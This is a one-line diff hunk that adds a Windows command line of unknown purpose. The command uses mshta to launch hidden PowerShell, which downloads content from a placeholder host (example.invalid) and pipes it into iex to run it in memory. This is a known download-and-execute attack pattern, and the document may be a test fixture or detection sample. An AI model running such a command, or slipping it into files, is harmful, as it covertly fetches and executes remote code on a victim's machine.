@@ -1,0 +1,1 @@
+mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -w hidden -c iwr https://example.invalid/x|iex")(window.close)
